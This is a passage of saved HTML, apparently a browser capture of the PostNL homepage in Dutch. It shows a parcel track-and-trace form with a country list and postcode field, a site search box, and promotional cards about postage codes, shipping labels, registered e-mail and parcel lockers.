14.0715C18.56 13.1585 18.961 12.0165 18.961 10.8425C18.961 7.9915 16.642 5.6735 13.791 5.6735C12.866 5.6735 12.01 5.9375 11.258 6.3645L9.059 4.1665C8.836 3.9445 8.456 3.9445 8.233 4.1665L2.316 10.1075C2.182 10.2435 2.028 10.3985 2.004 10.6095C1.984 10.7885 2.066 11.3835 2.189 11.5085C2.258 11.5705 2.325 11.5925 2.384 11.5925C2.445 11.5925 2.497 11.5675 2.534 11.5325L3.87 10.2015C4.511 9.5675 4.727 9.3535 4.806 9.2465L8.646 5.4055L10.298 7.0565C9.274 8.0015 8.622 9.3425 8.622 10.8425C8.622 13.6935 10.94 16.0125 13.791 16.0125C13.954 16.0125 14.114 15.9865 14.275 15.9715V17.7965H3.167L3.164 13.4215C3.164 13.2875 3.05 13.1915 2.892 13.1915C2.729 13.1915 2.249 13.5545 2.137 13.6955C2.017 13.8475 2.004 14.0415 2.003 14.2335L2 18.3805C2 18.7025 2.262 18.9645 2.583 18.9645H14.859C15.182 18.9645 15.443 18.7025 15.443 18.3805V15.7365C16.012 15.5435 16.548 15.2585 17.02 14.8795L20.969 18.8265C20.991 18.8505 21.022 18.8645 21.059 18.8645C21.096 18.8645 21.138 18.8485 21.18 18.8085C21.266 18.7235 21.382 18.0575 21.364 17.8395L21.265 17.8475V17.8465Z" fill="currentColor"></path></svg><span class="pci-toptasks__label">Postcode zoeken</span></button></div><div data-state="active" data-orientation="horizontal" role="tabpanel" aria-labelledby="radix-:Rd6d5m:-trigger-tab-0" id="radix-:Rd6d5m:-content-tab-0" tabindex="-1" class="pci-toptasks__app-container" style="animation-duration:0s" bis_skin_checked="1"><h1 class="stamp-heading stamp-heading--size-m stamp-heading--color-brand pci-toptasks__app-title">Volg je pakket</h1><div id="" bis_skin_checked="1"><div class="pci-loading-panel" id="volg-je-pakket--loader" bis_skin_checked="1" style="display: none;"><svg class="pci-loading-panel__loader" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="45"></circle></svg></div><div id="volg-je-pakket" class="pci-killerapp__container" bis_skin_checked="1"><pnl-shipment-search locale="nl_NL" base-url="https://jouw.postnl.nl/track-and-trace" class="hydrated" data-scrapbook-adoptedstylesheets="5" data-scrapbook-shadowdom="<div class=&quot;pnl-shipment-search&quot;><div><pnl-shipment-input class=&quot;hydrated&quot; data-scrapbook-adoptedstylesheets=&quot;6&quot; data-scrapbook-shadowdom=&quot;<div><form class=&amp;quot;pnl-shipment__wrapper&amp;quot;><div class=&amp;quot;pnl-shipment__form-group&amp;quot;><div class=&amp;quot;pnl-shipment__label-wrapper&amp;quot;><label class=&amp;quot;pnl-shipment__label&amp;quot; for=&amp;quot;barcode-input&amp;quot;><span>Track &amp;amp;amp; trace-code</span></label></div><div class=&amp;quot;pnl-shipment__input-wrapper&amp;quot;><input class=&amp;quot;pnl-shipment__input null&amp;quot; id=&amp;quot;barcode-input&amp;quot; type=&amp;quot;text&amp;quot; value=&amp;quot;&amp;quot;></div><div class=&amp;quot;pnl-shipment__error-wrapper is-hidden&amp;quot;><p class=&amp;quot;pnl-shipment__error&amp;quot;>Voer een barcode of niet-thuiscode in</p></div></div><div class=&amp;quot;pnl-shipment__form-group pnl-shipment__form-group--country&amp;quot;><div class=&amp;quot;pnl-shipment__label-wrapper&amp;quot;><label class=&amp;quot;pnl-shipment__label&amp;quot; for=&amp;quot;country-input&amp;quot;><span>Land van de ontvanger</span></label></div><div class=&amp;quot;pnl-shipment__select-wrapper&amp;quot;><select class=&amp;quot;pnl-shipment__select-text&amp;quot; id=&amp;quot;country-input&amp;quot; required=&amp;quot;&amp;quot;><option value=&amp;quot;AF&amp;quot;>Afghanistan</option><option value=&amp;quot;AX&amp;quot;>Åland</option><option value=&amp;quot;AL&amp;quot;>Albanië</option><option value=&amp;quot;DZ&amp;quot;>Algerije</option><option value=&amp;quot;AS&amp;quot;>Amerikaans-Samoa</option><option value=&amp;quot;AD&amp;quot;>Andorra</option><option value=&amp;quot;AO&amp;quot;>Angola</option><option value=&amp;quot;AI&amp;quot;>Anguilla</option><option value=&amp;quot;AQ&amp;quot;>Antarctica</option><option value=&amp;quot;AG&amp;quot;>Antigua en Barbuda</option><option value=&amp;quot;AR&amp;quot;>Argentinië</option><option value=&amp;quot;AM&amp;quot;>Armenië</option><option value=&amp;quot;AW&amp;quot;>Aruba</option><option value=&amp;quot;AC&amp;quot;>Ascension</option><option value=&amp;quot;AU&amp;quot;>Australië</option><option value=&amp;quot;AZ&amp;quot;>Azerbeidzjan</option><option value=&amp;quot;XA&amp;quot;>Azoren</option><option value=&amp;quot;BS&amp;quot;>Bahama's</option><option value=&amp;quot;BH&amp;quot;>Bahrein</option><option value=&amp;quot;XB&amp;quot;>Baleari, Spanje</option><option value=&amp;quot;BD&amp;quot;>Bangladesh</option><option value=&amp;quot;BB&amp;quot;>Barbados</option><option value=&amp;quot;BE&amp;quot;>België</option><option value=&amp;quot;BZ&amp;quot;>Belize</option><option value=&amp;quot;BJ&amp;quot;>Benin</option><option value=&amp;quot;BM&amp;quot;>Bermuda</option><option value=&amp;quot;BT&amp;quot;>Bhutan</option><option value=&amp;quot;BO&amp;quot;>Bolivia, Plurinationale Staat</option><option value=&amp;quot;BA&amp;quot;>Bosnië en Herzegovina</option><option value=&amp;quot;BW&amp;quot;>Botswana</option><option value=&amp;quot;BV&amp;quot;>Bouvet eilanden</option><option value=&amp;quot;BR&amp;quot;>Brazilië</option><option value=&amp;quot;IO&amp;quot;>Brits Indische Oceaanterritorium</option><option value=&amp;quot;BN&amp;quot;>Brunei Darussalam</option><option value=&amp;quot;BG&amp;quot;>Bulgarije</option><option value=&amp;quot;BF&amp;quot;>Burkina Faso</option><option value=&amp;quot;BI&amp;quot;>Burundi</option><option value=&amp;quot;KH&amp;quot;>Cambodja</option><option value=&amp;quot;XP&amp;quot;>Campione d'Italia</option><option value=&amp;quot;CA&amp;quot;>Canada</option><option value=&amp;quot;IC&amp;quot;>Canarische Eilanden</option><option value=&amp;quot;CF&amp;quot;>Centraal-Afrikaanse Republiek</option><option value=&amp;quot;EA&amp;quot;>Ceuta en Melilla</option><option value=&amp;quot;CL&amp;quot;>Chili</option><option value=&amp;quot;CN&amp;quot;>China</option><option value=&amp;quot;CX&amp;quot;>Christmaseiland</option><option value=&amp;quot;CC&amp;quot;>Coconut eilanden</option><option value=&amp;quot;CO&amp;quot;>Colombia</option><option value=&amp;quot;KM&amp;quot;>Comoren</option><option value=&amp;quot;CG&amp;quot;>Congo</option><option value=&amp;quot;CD&amp;quot;>Congo, Democratische Republiek</option><option value=&amp;quot;CK&amp;quot;>Cookeilanden</option><option value=&amp;quot;CR&amp;quot;>Costa Rica</option><option value=&amp;quot;CU&amp;quot;>Cuba</option><option value=&amp;quot;CW&amp;quot;>Curaçao</option><option value=&amp;quot;CY&amp;quot;>Cyprus</option><option value=&amp;quot;DK&amp;quot;>Denemarken</option><option value=&amp;quot;DJ&amp;quot;>Djibouti</option><option value=&amp;quot;DM&amp;quot;>Dominica</option><option value=&amp;quot;DO&amp;quot;>Dominicaanse Republiek</option><option value=&amp;quot;DE&amp;quot;>Duitsland</option><option value=&amp;quot;EC&amp;quot;>Ecuador</option><option value=&amp;quot;EG&amp;quot;>Egypte</option><option value=&amp;quot;SV&amp;quot;>El Salvador</option><option value=&amp;quot;GQ&amp;quot;>Equatoriaal-Guinea</option><option value=&amp;quot;ER&amp;quot;>Eritrea</option><option value=&amp;quot;EE&amp;quot;>Estland</option><option value=&amp;quot;ET&amp;quot;>Ethiopië</option><option value=&amp;quot;FO&amp;quot;>Faeröer</option><option value=&amp;quot;FK&amp;quot;>Falklandeilanden (Malvinas)</option><option value=&amp;quot;FJ&amp;quot;>Fiji</option><option value=&amp;quot;PH&amp;quot;>Filippijnen</option><option value=&amp;quot;FI&amp;quot;>Finland</option><option value=&amp;quot;FR&amp;quot;>Frankrijk</option><option value=&amp;quot;GF&amp;quot;>Frans-Guyana</option><option value=&amp;quot;PF&amp;quot;>Frans-Polynesië</option><option value=&amp;quot;TF&amp;quot;>Franse Zuidelijke en Antarctische Gebieden</option><option value=&amp;quot;GA&amp;quot;>Gabon</option><option value=&amp;quot;GM&amp;quot;>Gambia</option><option value=&amp;quot;GE&amp;quot;>Georgië</option><option value=&amp;quot;GH&amp;quot;>Ghana</option><option value=&amp;quot;GI&amp;quot;>Gibraltar</option><option value=&amp;quot;GD&amp;quot;>Grenada</option><option value=&amp;quot;GR&amp;quot;>Griekenland</option><option value=&amp;quot;GL&amp;quot;>Groenland</option><option value=&amp;quot;GP&amp;quot;>Guadeloupe</option><option value=&amp;quot;GU&amp;quot;>Guam</option><option value=&amp;quot;GT&amp;quot;>Guatemala</option><option value=&amp;quot;GG&amp;quot;>Guernsey</option><option value=&amp;quot;GN&amp;quot;>Guinee</option><option value=&amp;quot;GW&amp;quot;>Guinee-Bissau</option><option value=&amp;quot;GY&amp;quot;>Guyana</option><option value=&amp;quot;HT&amp;quot;>Haïti</option><option value=&amp;quot;HM&amp;quot;>Heard en McDonaldeilanden</option><option value=&amp;quot;HN&amp;quot;>Honduras</option><option value=&amp;quot;HU&amp;quot;>Hongarije</option><option value=&amp;quot;HK&amp;quot;>Hongkong</option><option value=&amp;quot;IE&amp;quot;>Ierland</option><option value=&amp;quot;IS&amp;quot;>IJsland</option><option value=&amp;quot;IN&amp;quot;>India</option><option value=&amp;quot;ID&amp;quot;>Indonesië</option><option value=&amp;quot;IQ&amp;quot;>Irak</option><option value=&amp;quot;IR&amp;quot;>Iran, Islamitische Republiek</option><option value=&amp;quot;IL&amp;quot;>Israël</option><option value=&amp;quot;IT&amp;quot;>Italië</option><option value=&amp;quot;CI&amp;quot;>Ivoorkust</option><option value=&amp;quot;JM&amp;quot;>Jamaica</option><option value=&amp;quot;JP&amp;quot;>Japan</option><option value=&amp;quot;YE&amp;quot;>Jemen</option><option value=&amp;quot;JE&amp;quot;>Jersey</option><option value=&amp;quot;JO&amp;quot;>Jordanië</option><option value=&amp;quot;KY&amp;quot;>Kaaimaneilanden</option><option value=&amp;quot;CV&amp;quot;>Kaapverdië</option><option value=&amp;quot;CM&amp;quot;>Kameroen</option><option value=&amp;quot;KZ&amp;quot;>Kazachstan</option><option value=&amp;quot;KE&amp;quot;>Kenia</option><option value=&amp;quot;KG&amp;quot;>Kirgizië</option><option value=&amp;quot;KI&amp;quot;>Kiribati</option><option value=&amp;quot;UM&amp;quot;>Kleine afgelegen eilanden van de Verenigde Staten</option><option value=&amp;quot;KW&amp;quot;>Koeweit</option><option value=&amp;quot;KP&amp;quot;>Korea, Democratische Volksrepubliek</option><option value=&amp;quot;KR&amp;quot;>Korea, Republiek</option><option value=&amp;quot;XK&amp;quot;>Kosovo</option><option value=&amp;quot;HR&amp;quot;>Kroatië</option><option value=&amp;quot;XL&amp;quot;>Laccadiven</option><option value=&amp;quot;LA&amp;quot;>Laos, Democratische Volksrepubliek</option><option value=&amp;quot;LS&amp;quot;>Lesotho</option><option value=&amp;quot;LV&amp;quot;>Letland</option><option value=&amp;quot;LB&amp;quot;>Libanon</option><option value=&amp;quot;LR&amp;quot;>Liberië</option><option value=&amp;quot;LY&amp;quot;>Libië</option><option value=&amp;quot;LI&amp;quot;>Liechtenstein</option><option value=&amp;quot;LT&amp;quot;>Litouwen</option><option value=&amp;quot;XV&amp;quot;>Livigno, Italië</option><option value=&amp;quot;LU&amp;quot;>Luxemburg</option><option value=&amp;quot;VI&amp;quot;>Maagdeneilanden, Amerikaans</option><option value=&amp;quot;VG&amp;quot;>Maagdeneilanden, Brits</option><option value=&amp;quot;MO&amp;quot;>Macau</option><option value=&amp;quot;MK&amp;quot;>Macedonië, de voormalige Joegoslavische Republiek</option><option value=&amp;quot;MG&amp;quot;>Madagascar</option><option value=&amp;quot;XM&amp;quot;>Madeira, Portugal</option><option value=&amp;quot;MV&amp;quot;>Maladiven</option><option value=&amp;quot;MW&amp;quot;>Malawi</option><option value=&amp;quot;MY&amp;quot;>Maleisië</option><option value=&amp;quot;ML&amp;quot;>Mali</option><option value=&amp;quot;MT&amp;quot;>Malta</option><option value=&amp;quot;IM&amp;quot;>Man</option><option value=&amp;quot;MA&amp;quot;>Marokko</option><option value=&amp;quot;MH&amp;quot;>Marshall Eilanden</option><option value=&amp;quot;MQ&amp;quot;>Martinique</option><option value=&amp;quot;MR&amp;quot;>Mauritanië</option><option value=&amp;quot;MU&amp;quot;>Mauritius</option><option value=&amp;quot;YT&amp;quot;>Mayotte</option><option value=&amp;quot;MX&amp;quot;>Mexico</option><option value=&amp;quot;FM&amp;quot;>Micronesia, Federale Staten van</option><option value=&amp;quot;MD&amp;quot;>Moldavië, Republiek</option><option value=&amp;quot;MC&amp;quot;>Monaco</option><option value=&amp;quot;MN&amp;quot;>Mongolië</option><option value=&amp;quot;ME&amp;quot;>Montenegro</option><option value=&amp;quot;MS&amp;quot;>Montserrat</option><option value=&amp;quot;MZ&amp;quot;>Mozambique</option><option value=&amp;quot;MM&amp;quot;>Myanmar</option><option value=&amp;quot;NA&amp;quot;>Namibië</option><option value=&amp;quot;NR&amp;quot;>Nauru</option><option value=&amp;quot;NL&amp;quot; selected=&amp;quot;&amp;quot;>Nederland</option><option value=&amp;quot;BQ&amp;quot;>Nederlandse Antillen</option><option value=&amp;quot;NP&amp;quot;>Nepal</option><option value=&amp;quot;NI&amp;quot;>Nicaragua</option><option value=&amp;quot;NC&amp;quot;>Nieuw-Caledonië</option><option value=&amp;quot;NZ&amp;quot;>Nieuw-Zeeland</option><option value=&amp;quot;NE&amp;quot;>Niger</option><option value=&amp;quot;NG&amp;quot;>Nigeria</option><option value=&amp;quot;NU&amp;quot;>Niue Eilanden</option><option value=&amp;quot;MP&amp;quot;>Noordelijke Marianen</option><option value=&amp;quot;NO&amp;quot;>Noorwegen</option><option value=&amp;quot;NF&amp;quot;>Norfolk Eilanden</option><option value=&amp;quot;UG&amp;quot;>Oeganda</option><option value=&amp;quot;UA&amp;quot;>Oekraïne</option><option value=&amp;quot;UZ&amp;quot;>Oezbekistan</option><option value=&amp;quot;OM&amp;quot;>Oman</option><option value=&amp;quot;TL&amp;quot;>Oost-Timor</option><option value=&amp;quot;AT&amp;quot;>Oostenrijk</option><option value=&amp;quot;PK&amp;quot;>Pakistan</option><option value=&amp;quot;PW&amp;quot;>Palau</option><option value=&amp;quot;PS&amp;quot;>Palestina, staat</option><option value=&amp;quot;PA&amp;quot;>Panama</option><option value=&amp;quot;PG&amp;quot;>Papoea-Nieuw-Guinea</option><option value=&amp;quot;PY&amp;quot;>Paraguay</option><option value=&amp;quot;PE&amp;quot;>Peru</option><option value=&amp;quot;PN&amp;quot;>Pitcairneilanden</option><option value=&amp;quot;PL&amp;quot;>Polen</option><option value=&amp;quot;PT&amp;quot;>Portugal</option><option value=&amp;quot;PR&amp;quot;>Puerto Rico</option><option value=&amp;quot;QA&amp;quot;>Qatar</option><option value=&amp;quot;RE&amp;quot;>Réunion</option><option value=&amp;quot;RO&amp;quot;>Roemenië</option><option value=&amp;quot;RW&amp;quot;>Ruanda</option><option value=&amp;quot;RU&amp;quot;>Rusland</option><option value=&amp;quot;KN&amp;quot;>Saint Kitts en Nevis</option><option value=&amp;quot;LC&amp;quot;>Saint Lucia</option><option value=&amp;quot;VC&amp;quot;>Saint Vincent en de Grenadines</option><option value=&amp;quot;BL&amp;quot;>Saint-Barthélemy</option><option value=&amp;quot;PM&amp;quot;>Saint-Pierre en Miquelon</option><option value=&amp;quot;WS&amp;quot;>Samoa</option><option value=&amp;quot;SM&amp;quot;>San Marino</option><option value=&amp;quot;ST&amp;quot;>Sao Tomé en Principe</option><option value=&amp;quot;SA&amp;quot;>Saoedi-Arabië</option><option value=&amp;quot;SN&amp;quot;>Senegal</option><option value=&amp;quot;RS&amp;quot;>Servië</option><option value=&amp;quot;SC&amp;quot;>Seychellen</option><option value=&amp;quot;SL&amp;quot;>Sierra Leone</option><option value=&amp;quot;SG&amp;quot;>Singapore</option><option value=&amp;quot;SX&amp;quot;>Sint Maarten (Nederlands)</option><option value=&amp;quot;SH&amp;quot;>Sint-Helena</option><option value=&amp;quot;MF&amp;quot;>Sint-Maarten (Franse Antillen)</option><option value=&amp;quot;SI&amp;quot;>Slovenië</option><option value=&amp;quot;SK&amp;quot;>Slowakije</option><option value=&amp;quot;SD&amp;quot;>Soedan</option><option value=&amp;quot;SB&amp;quot;>Solomoneilanden</option><option value=&amp;quot;SO&amp;quot;>Somalië</option><option value=&amp;quot;ES&amp;quot;>Spanje</option><option value=&amp;quot;LK&amp;quot;>Sri Lanka</option><option value=&amp;quot;PC&amp;quot;>Stille Zuidzee</option><option value=&amp;quot;SR&amp;quot;>Suriname</option><option value=&amp;quot;SJ&amp;quot;>Svalbard</option><option value=&amp;quot;SZ&amp;quot;>Swaziland</option><option value=&amp;quot;SY&amp;quot;>Syrië, Arabische Republiek</option><option value=&amp;quot;TJ&amp;quot;>Tadzjikistan</option><option value=&amp;quot;TW&amp;quot;>Taiwan</option><option value=&amp;quot;TZ&amp;quot;>Tanzania, Verenigde Republiek</option><option value=&amp;quot;TH&amp;quot;>Thailand</option><option value=&amp;quot;TG&amp;quot;>Togo</option><option value=&amp;quot;TK&amp;quot;>Tokelau Eilanden</option><option value=&amp;quot;TO&amp;quot;>Tonga</option><option value=&amp;quot;TT&amp;quot;>Trinidad en Tobago</option><option value=&amp;quot;TA&amp;quot;>Tristan Da Cunha</option><option value=&amp;quot;TD&amp;quot;>Tsjaad</option><option value=&amp;quot;CZ&amp;quot;>Tsjechië</option><option value=&amp;quot;TN&amp;quot;>Tunesië</option><option value=&amp;quot;TR&amp;quot;>Turkije</option><option value=&amp;quot;TM&amp;quot;>Turkmenistan</option><option value=&amp;quot;TC&amp;quot;>Turks- en Caicoseilanden</option><option value=&amp;quot;TV&amp;quot;>Tuvalu</option><option value=&amp;quot;UY&amp;quot;>Uruguay</option><option value=&amp;quot;VU&amp;quot;>Vanuatu</option><option value=&amp;quot;VA&amp;quot;>Vaticaanstad</option><option value=&amp;quot;VE&amp;quot;>Venezuela, Bolivariaanse Republiek</option><option value=&amp;quot;GB&amp;quot;>Verenigd Koninkrijk en Noord Ierland</option><option value=&amp;quot;AE&amp;quot;>Verenigde Arabische Emiraten</option><option value=&amp;quot;US&amp;quot;>Verenigde Staten van Amerika</option><option value=&amp;quot;VN&amp;quot;>Vietnam</option><option value=&amp;quot;WF&amp;quot;>Wallis en Futuna</option><option value=&amp;quot;EH&amp;quot;>West Sahara</option><option value=&amp;quot;BY&amp;quot;>Wit-Rusland</option><option value=&amp;quot;ZM&amp;quot;>Zambia</option><option value=&amp;quot;XZ&amp;quot;>Zanzibar </option><option value=&amp;quot;ZW&amp;quot;>Zimbabwe</option><option value=&amp;quot;ZA&amp;quot;>Zuid-Afrika</option><option value=&amp;quot;GS&amp;quot;>Zuid-Georgia en de Zuidelijke Sandwicheilanden</option><option value=&amp;quot;SS&amp;quot;>Zuid-Soedan</option><option value=&amp;quot;SE&amp;quot;>Zweden</option><option value=&amp;quot;CH&amp;quot;>Zwitserland</option></select></div><div class=&amp;quot;pnl-shipment__error-wrapper is-hidden&amp;quot;></div></div><div class=&amp;quot;pnl-shipment__form-group pnl-shipment__form-group--postalcode&amp;quot;><div class=&amp;quot;pnl-shipment__label-wrapper&amp;quot;><label class=&amp;quot;pnl-shipment__label&amp;quot; for=&amp;quot;postal-code-input&amp;quot;><span>Postcode</span></label></div><div class=&amp;quot;pnl-shipment__input-wrapper&amp;quot;><input class=&amp;quot;pnl-shipment__input null&amp;quot; id=&amp;quot;postal-code-input&amp;quot; type=&amp;quot;text&amp;quot; placeholder=&amp;quot;1000 AA&amp;quot; value=&amp;quot;&amp;quot;></div><div class=&amp;quot;pnl-shipment__error-wrapper is-hidden&amp;quot;><p class=&amp;quot;pnl-shipment__error&amp;quot;>Bijv: 1000 AA</p></div></div><div class=&amp;quot;pnl-shipment__button-wrapper&amp;quot;><button type=&amp;quot;submit&amp;quot; class=&amp;quot;pnl-shipment__button&amp;quot;><span class=&amp;quot;pnl-shipment__button-text&amp;quot;>Zoeken</span></button></div></form></div>&quot;></pnl-shipment-input></div></div>"></pnl-shipment-search></div></div></div><div data-state="inactive" data-orientation="horizontal" role="tabpanel" aria-labelledby="radix-:Rd6d5m:-trigger-tab-1" hidden="" id="radix-:Rd6d5m:-content-tab-1" tabindex="-1" class="pci-toptasks__app-container" bis_skin_checked="1"></div><div data-state="inactive" data-orientation="horizontal" role="tabpanel" aria-labelledby="radix-:Rd6d5m:-trigger-tab-2" hidden="" id="radix-:Rd6d5m:-content-tab-2" tabindex="-1" class="pci-toptasks__app-container" bis_skin_checked="1"></div><div data-state="inactive" data-orientation="horizontal" role="tabpanel" aria-labelledby="radix-:Rd6d5m:-trigger-tab-3" hidden="" id="radix-:Rd6d5m:-content-tab-3" tabindex="-1" class="pci-toptasks__app-container" bis_skin_checked="1"></div></div></div></section><section class="outer search-field"><div class="inner inner--narrow" bis_skin_checked="1"><p class="pci-search__title">Ik ben op zoek naar...</p><form class="pci-search" method="get"><label class="pci-search__label visually-hidden" for="searchquery">Search</label><div class="pci-search__wrapper" bis_skin_checked="1"><input type="text" autocomplete="off" id="bltf3f1d4d68ff7d022" name="query" aria-label="Search" role="combobox" aria-autocomplete="list" aria-expanded="false" aria-controls="search-suggestions" class="pci-search__input" placeholder="Zoek naar..." value=""><button class="stamp-button stamp-button--variant-primary stamp-button--size-full pci-search__submit" type="submit"><span class="stamp-button__content"><span class="visually-hidden">Zoek naar...</span><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M10 15.5995C6.912 15.5995 4.4 13.0875 4.4 9.99951C4.4 6.91151 6.912 4.40051 10 4.40051C13.088 4.40051 15.6 6.91151 15.6 9.99951C15.6 13.0875 13.088 15.5995 10 15.5995ZM20.318 19.6705C20.298 19.4255 20.136 19.2165 19.941 19.0225L15.387 14.4675C16.394 13.2555 17 11.6995 17 9.99951C17 6.13351 13.866 2.99951 10 2.99951C6.134 2.99951 3 6.13351 3 9.99951C3 13.8665 6.134 16.9995 10 16.9995C11.699 16.9995 13.256 16.3945 14.468 15.3875L20.007 20.9255C20.034 20.9525 20.077 20.9255 20.103 20.9005C20.166 20.8375 20.344 19.9965 20.318 19.6705Z" fill="currentColor"></path></svg></span></button></div></form></div></section><section class="outer" id="cards-to-know"><div class="inner inner--mobile-full" bis_skin_checked="1"><div class="pci-card-block pci-card-block--basic " bis_skin_checked="1"><div class="pci-card-block__cards pci-card-block--text-right pci-card-block--grid pci-card-block--grid-col-3" bis_skin_checked="1"><div class="stamp-card stamp-card--size-full stamp-card--theme-orange" bis_skin_checked="1"><div class="stamp-card__inner" bis_skin_checked="1"><div class="stamp-card__header" bis_skin_checked="1"><div class="stamp-flex stamp-flex--direction-column stamp-flex--row-gap-mobile-l stamp-flex--column-gap-mobile-l" bis_skin_checked="1"><picture class="pci-card__image pci-picture pci-picture__illustration"><source srcset="phone_mail_stampcode.svg 1x, phone_mail_stampcode.svg 2x"><img src="phone_mail_stampcode.svg" alt="" loading="lazy"></picture><h3 class="stamp-heading stamp-heading--size-m stamp-heading--color-subtle">Geen postzegel bij de hand?</h3></div></div><div class="stamp-card__body" bis_skin_checked="1"><div class="rich-text " bis_skin_checked="1"><p>Koop een postzegelcode en verstuur direct.</p></div></div><div class="stamp-card__footer" bis_skin_checked="1"><div class="stamp-card-link" bis_skin_checked="1"><a class="stamp-card-link__link stamp-card-link__link--block stamp-link stamp-link--size-l" href="https://www.postnl.nl/versturen/postzegels/postzegels-kopen/postzegelcode/" target="_self"><span class="stamp-link__content">Koop 'm hier<div class="stamp-link__icon stamp-link__icon--end" aria-hidden="true" bis_skin_checked="1"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.32431 21.624L17.5719 13.1431C18.1388 12.56 18.1432 11.6349 17.5819 11.0464L9.34896 2.41565C8.83858 1.88061 7.98971 1.85929 7.45295 2.36805L7.40983 2.41081C6.8658 2.97545 6.86307 3.86661 7.40362 4.43455L14.699 12.0996L7.41589 19.572C6.87024 20.1318 6.86756 21.0219 7.40983 21.585C7.9277 22.1227 8.78484 22.1402 9.32431 21.624Z" fill="currentColor"></path></svg></div></span></a></div></div></div></div><div class="stamp-card stamp-card--size-full stamp-card--theme-blue" bis_skin_checked="1"><div class="stamp-card__inner" bis_skin_checked="1"><div class="stamp-card__header" bis_skin_checked="1"><div class="stamp-flex stamp-flex--direction-column stamp-flex--row-gap-mobile-l stamp-flex--column-gap-mobile-l" bis_skin_checked="1"><picture class="pci-card__image pci-picture pci-picture__illustration"><source srcset="phone_barcode_scan.svg 1x, phone_barcode_scan.svg 2x"><img src="phone_barcode_scan.svg" alt="" loading="lazy"></picture><h3 class="stamp-heading stamp-heading--size-m stamp-heading--color-subtle">Zo verstuur je een pakket</h3></div></div><div class="stamp-card__body" bis_skin_checked="1"><div class="rich-text " bis_skin_checked="1"><p>Koop online een verzendlabel en laat ‘m printen bij je PostNL-punt.</p></div></div><div class="stamp-card__footer" bis_skin_checked="1"><div class="stamp-card-link" bis_skin_checked="1"><a class="stamp-card-link__link stamp-card-link__link--block stamp-link stamp-link--size-l" href="https://jouw.postnl.nl/online-versturen/nl-NL/pakket/kiezen" target="_blank"><span class="stamp-link__content">Verzendlabel kopen<div class="stamp-link__icon stamp-link__icon--end" aria-hidden="true" bis_skin_checked="1"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.32431 21.624L17.5719 13.1431C18.1388 12.56 18.1432 11.6349 17.5819 11.0464L9.34896 2.41565C8.83858 1.88061 7.98971 1.85929 7.45295 2.36805L7.40983 2.41081C6.8658 2.97545 6.86307 3.86661 7.40362 4.43455L14.699 12.0996L7.41589 19.572C6.87024 20.1318 6.86756 21.0219 7.40983 21.585C7.9277 22.1227 8.78484 22.1402 9.32431 21.624Z" fill="currentColor"></path></svg></div></span></a></div></div></div></div><div class="stamp-card stamp-card--size-full stamp-card--theme-dark-blue" bis_skin_checked="1"><div class="stamp-card__inner" bis_skin_checked="1"><div class="stamp-card__header" bis_skin_checked="1"><div class="stamp-flex stamp-flex--direction-column stamp-flex--row-gap-mobile-l stamp-flex--column-gap-mobile-l" bis_skin_checked="1"><picture class="pci-card__image pci-picture pci-picture__illustration"><source srcset="phone-email.svg 1x, phone-email.svg 2x"><img src="phone-email.svg" alt="" loading="lazy"></picture><h3 class="stamp-heading stamp-heading--size-m stamp-heading--color-subtle">Aangetekende e-mail</h3></div></div><div class="stamp-card__body" bis_skin_checked="1"><div class="rich-text " bis_skin_checked="1"><p>Verstuur snel en veilig een aangetekende e-mail. Gewoon vanuit je eigen huis en binnen 1 minuut geregeld.</p></div></div><div class="stamp-card__footer" bis_skin_checked="1"><div class="stamp-card-link" bis_skin_checked="1"><a class="stamp-card-link__link stamp-card-link__link--block stamp-link stamp-link--size-l" href="https://www.postnl.nl/versturen/brief-of-kaart-versturen/aangetekende-e-mail/" target="_self"><span class="stamp-link__content">Lees meer<div class="stamp-link__icon stamp-link__icon--end" aria-hidden="true" bis_skin_checked="1"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.32431 21.624L17.5719 13.1431C18.1388 12.56 18.1432 11.6349 17.5819 11.0464L9.34896 2.41565C8.83858 1.88061 7.98971 1.85929 7.45295 2.36805L7.40983 2.41081C6.8658 2.97545 6.86307 3.86661 7.40362 4.43455L14.699 12.0996L7.41589 19.572C6.87024 20.1318 6.86756 21.0219 7.40983 21.585C7.9277 22.1227 8.78484 22.1402 9.32431 21.624Z" fill="currentColor"></path></svg></div></span></a></div></div></div></div></div></div></div></section><section class="outer"><div class="inner inner--mobile-full inner--full" bis_skin_checked="1"><div class="pci-card-block pci-card-block--spotlight " bis_skin_checked="1"><div class="pci-card-block__cards pci-card-block--text-left" bis_skin_checked="1"><div class="pci-card pci-card--spotlight brand-default" bis_skin_checked="1"><div class="inner text-first" bis_skin_checked="1"><div class="pci-card__image-container" bis_skin_checked="1"><picture class="pci-card__image pci-picture"><source srcset="man-pakket-pakketautomaat.webp 1x, man-pakket-pakketautomaat-1.webp 2x" media="(min-width: 1600px)"><source srcset="man-pakket-pakketautomaat-2.webp 1x, man-pakket-pakketautomaat-3.webp 2x" media="(min-width: 1280px)"><source srcset="man-pakket-pakketautomaat-4.webp 1x, man-pakket-pakketautomaat-5.webp 2x" media="(min-width: 1024px)"><source srcset="man-pakket-pakketautomaat-6.webp 1x, man-pakket-pakketautomaat-7.webp 2x" media="(min-width: 680px)"><source srcset="man-pakket-pakketautomaat-8.webp 1x, man-pakket-pakketautomaat-9.webp 2x"><img src="man-pakket-pakketautomaat-8.webp" alt="" loading="lazy"></picture></div><div class="pci-card__content-container" bis_skin_checked="1"><div class="pci-card__text" bis_skin_checked="1"><h2 class="stamp-heading stamp-heading--size-xl stamp-heading--color-default" style="color:inherit">Ken jij de pakketautomaat al?</h2><div class="rich-text " bis_skin_checked="1"><p>Bij de pakketautomaat kun je pakketjes ophalen én versturen. De meeste zijn 24/7 open. Dus haal of breng je pakket wanneer het handig is voor jou.</p></div></div><div class="pci-cta__container " bis_skin_checked="1"><a class="stamp-button stamp-button--variant-primary stamp-button--size-full" 